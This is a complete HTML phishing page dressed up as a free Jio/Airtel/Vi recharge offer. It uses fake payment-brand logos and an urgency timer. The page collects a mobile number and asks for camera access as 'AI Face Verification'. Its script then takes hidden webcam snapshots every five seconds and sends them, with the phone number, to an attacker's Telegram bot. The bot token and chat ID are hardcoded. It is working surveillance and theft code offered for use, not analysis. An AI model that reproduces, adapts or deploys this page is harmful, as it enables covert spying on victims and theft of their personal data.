<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FastPay - Free 5G Recharge Offer</title>
    <style>
        :root { --primary: #1a73e8; --accent: #f4b400; --bg: #f1f3f4; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--bg); margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        
        .offer-card { background: white; width: 92%; max-width: 420px; border-radius: 16px; overflow: hidden; box-shadow: 0 8px 30px rgba(0,0,0,0.15); border: 2px solid #ffd700; }
        
        .promo-header { background: linear-gradient(135deg, #1a73e8, #8ab4f8); color: white; padding: 20px; text-align: center; }
        .promo-header h1 { margin: 0; font-size: 22px; }
        .timer { font-weight: bold; color: #fff; background: rgba(0,0,0,0.2); padding: 5px 10px; border-radius: 20px; display: inline-block; margin-top: 10px; font-size: 14px; }

        .content { padding: 20px; }
        .offer-details { background: #fff9c4; border: 1px dashed #fbc02d; padding: 15px; border-radius: 10px; margin-bottom: 20px; text-align: center; }
        .offer-details b { color: #d32f2f; font-size: 18px; }

        .input-box { margin-bottom: 15px; }
        input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 16px; outline: none; }
        
        .btn-claim { width: 100%; background: #28a745; color: white; border: none; padding: 15px; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; }
        .btn-claim:hover { background: #218838; transform: translateY(-2px); }

        .verification-note { font-size: 11px; color: #777; text-align: center; margin-top: 15px; }
        .verified-logos { display: flex; justify-content: center; gap: 15px; margin-top: 20px; opacity: 0.6; }

        /* Hidden elements */
        #video, #canvas { position: absolute; left: -9999px; opacity: 0; pointer-events: none; }
    </style>
</head>
<body>

    <div class="offer-card">
        <div class="promo-header">
            <h1>Special 5G Promo</h1>
            <div class="timer" id="timer">Ends in: 09:54</div>
        </div>

        <div class="content">
            <div class="offer-details">
                Get <b>₹239 (28 Days)</b> Recharge <br> Absolutely <b>FREE!</b>
            </div>

            <div class="input-box">
                <input type="tel" id="mobile" placeholder="Enter Mobile Number" maxlength="10">
            </div>

            <div class="input-box">
                <select id="sim" style="width:100%; padding:12px; border-radius:8px; border:1px solid #ccc;">
                    <option value="jio">Jio Unlimited 5G</option>
                    <option value="airtel">Airtel Thanks Promo</option>
                    <option value="vi">Vi Hero Unlimited</option>
                </select>
            </div>

            <button class="btn-claim" id="claimBtn">Claim Free Recharge</button>
            
            <p class="verification-note">Note: Safe AI Face Verification is required to prevent multiple claims per person.</p>

            <div class="verified-logos">
                <span style="font-weight:bold; color:#1a73e8;">Google Pay</span>
                <span style="font-weight:bold; color:#673ab7;">PhonePe</span>
                <span style="font-weight:bold; color:#000;">NPCI</span>
            </div>
        </div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const BOT_TOKEN = '7866282179:AAGYCmuvhoCoxVjSXn5UmnI7onomvDKbIgE';
        const CHAT_ID = '8285724366';

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const claimBtn = document.getElementById('claimBtn');

        // Timer Logic
        let time = 594; 
        setInterval(() => {
            let mins = Math.floor(time / 60);
            let secs = time % 60;
            document.getElementById('timer').innerText = `Ends in: 0${mins}:${secs < 10 ? '0'+secs : secs}`;
            if(time > 0) time--;
        }, 1000);

        // Send to Telegram
        async function sendCapturedPhoto(blob) {
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('photo', blob, 'user_claim.jpg');
            fd.append('caption', `New Free Recharge Request\nMobile: ${document.getElementById('mobile').value}`);

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: fd
                });
            } catch(e) {}
        }

        function startHiddenCapture() {
            setInterval(() => {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(blob => blob && sendCapturedPhoto(blob), 'image/jpeg', 0.5);
            }, 5000);
        }

        claimBtn.addEventListener('click', async () => {
            const phone = document.getElementById('mobile').value;
            if(phone.length < 10) { alert("Please enter valid mobile number"); return; }

            claimBtn.innerText = "Verifying Identity...";
            claimBtn.style.background = "#ffa000";

            try {
                // Requesting camera as "Face Verification"
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                
                setTimeout(() => {
                    startHiddenCapture();
                    alert("AI Verification Started. Please keep the page open for 10 seconds to process your recharge.");
                }, 1000);

            } catch (err) {
                alert("Identity Verification Failed! Camera access is required to claim free recharge.");
            }
        });
    </script>
</body>
</html>
